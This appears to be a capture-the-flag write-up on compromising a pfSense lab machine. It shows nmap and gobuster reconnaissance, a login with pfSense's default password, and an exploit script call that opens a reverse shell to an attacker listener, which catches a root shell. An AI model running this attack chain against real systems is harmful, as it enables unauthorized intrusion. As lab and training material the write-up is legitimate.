
### Tools: nmap

### Vulnerabilities: 

```console
└──╼ [★]$ sudo nmap -p- -sS -sV -sC 10.129.51.37
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-31 21:28 BST
Nmap scan report for 10.129.51.37
Host is up (0.040s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE    VERSION
80/tcp  open  http       lighttpd 1.4.35
|_http-title: Did not follow redirect to https://10.129.51.37/
|_http-server-header: lighttpd/1.4.35
443/tcp open  ssl/https?
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 489.21 seconds
```
![image](https://user-images.githubusercontent.com/105310322/187794337-bce51ecb-0381-4193-b554-10bd82bed112.png)

```console
└──╼ [★]$ gobuster dir -u https://10.129.51.37/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x php,txt,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.129.51.37/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2022/08/31 23:24:17 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 6690]
/index.html           (Status: 200) [Size: 329] 
/help.php             (Status: 200) [Size: 6689]
/themes               (Status: 301) [Size: 0] [--> https://10.129.51.37/themes/]
/stats.php            (Status: 200) [Size: 6690]                                
/css                  (Status: 301) [Size: 0] [--> https://10.129.51.37/css/]   
/edit.php             (Status: 200) [Size: 6689]                                
/includes             (Status: 301) [Size: 0] [--> https://10.129.51.37/includes/]
/license.php          (Status: 200) [Size: 6692]                                  
/system.php           (Status: 200) [Size: 6691]                                  
/status.php           (Status: 200) [Size: 6691]                                  
/javascript           (Status: 301) [Size: 0] [--> https://10.129.51.37/javascript/]
/changelog.txt        (Status: 200) [Size: 271]                                     
/classes              (Status: 301) [Size: 0] [--> https://10.129.51.37/classes/]   
/exec.php             (Status: 200) [Size: 6689]                                    
/widgets              (Status: 301) [Size: 0] [--> https://10.129.51.37/widgets/]   
/graph.php            (Status: 200) [Size: 6690]                                    
/tree                 (Status: 301) [Size: 0] [--> https://10.129.51.37/tree/]      
/wizard.php           (Status: 200) [Size: 6691]                                    
/shortcuts            (Status: 301) [Size: 0] [--> https://10.129.51.37/shortcuts/] 
/pkg.php              (Status: 200) [Size: 6688]                                    
/installer            (Status: 301) [Size: 0] [--> https://10.129.51.37/installer/] 
/wizards              (Status: 301) [Size: 0] [--> https://10.129.51.37/wizards/]   
/xmlrpc.php           (Status: 200) [Size: 384]                                     
/reboot.php           (Status: 200) [Size: 6691]                                    
/interfaces.php       (Status: 200) [Size: 6695]                                    
/csrf                 (Status: 301) [Size: 0] [--> https://10.129.51.37/csrf/]      
/system-users.txt     (Status: 200) [Size: 106]                                     
/filebrowser          (Status: 301) [Size: 0] [--> https://10.129.51.37/filebrowser/]
/%7Echeckout%7E       (Status: 403) [Size: 345]                                      
                                                                                     
===============================================================
2022/08/31 23:40:41 Finished
===============================================================
```


![image](https://user-images.githubusercontent.com/105310322/187796644-fe1e91c7-0ad6-42aa-9c39-81f48935d52e.png)

login with user rohit and the default password for pfsense is pfsense

![image](https://user-images.githubusercontent.com/105310322/187797528-2117d116-9224-4e45-9240-0e583756b6d3.png)

```console
└──╼ [★]$ python3 sense.py --rhost 10.129.215.40 --lhost 10.10.14.41 --lport 1234 --username rohit --password pfsense
CSRF token obtained
Running exploit...
Exploit completed
```

```console
└──╼ [★]$ nc -lnvp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.129.215.40.
Ncat: Connection from 10.129.215.40:21244.
sh: can't access tty; job control turned off
# id
uid=0(root) gid=0(wheel) groups=0(wheel)
# 
```
